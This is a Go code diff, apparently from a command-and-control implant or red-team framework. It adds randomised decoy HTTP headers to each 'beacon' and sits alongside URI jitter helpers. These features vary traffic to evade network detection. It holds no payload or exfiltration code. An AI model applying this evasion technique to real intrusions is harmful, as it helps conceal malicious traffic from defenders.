@@ -98,6 +98,40 @@ func placementQueryName(configured string) string {
 	return pool[rng.Intn(len(pool))]
 }
 
+// poolSkipHeaders are functional headers that must never rotate: changing
+// them per beacon breaks transport semantics (framing, auth, routing).
+var poolSkipHeaders = map[string]bool{
+	"content-type": true, "content-length": true, "host": true,
+	"cookie": true, "user-agent": true, "authorization": true,
+	"proxy-authorization": true,
+}
+
+// randomPoolHeader picks one decoy header from the v2 request_header_pool
+// ("Name: value" lines) per beacon. Empty pool (or no valid entries) returns
+// false and the beacon goes out with its static headers only.
+func randomPoolHeader() (string, string, bool) {
+	var pool [][2]string
+	for _, line := range strings.Split(RequestHeaderPoolStr, "\n") {
+		i := strings.Index(line, ":")
+		if i < 0 {
+			continue
+		}
+		name, value := strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+1:])
+		if name == "" || value == "" {
+			continue
+		}
+		if poolSkipHeaders[strings.ToLower(name)] {
+			continue
+		}
+		pool = append(pool, [2]string{name, value})
+	}
+	if len(pool) == 0 {
+		return "", "", false
+	}
+	pick := pool[rng.Intn(len(pool))]
+	return pick[0], pick[1], true
+}
+
 // jitterQueryPair returns a random junk query name=value pair for URI jitter.
 func jitterQueryPair() (string, string) {
 	const letters = "abcdefghijklmnopqrstuvwxyz"
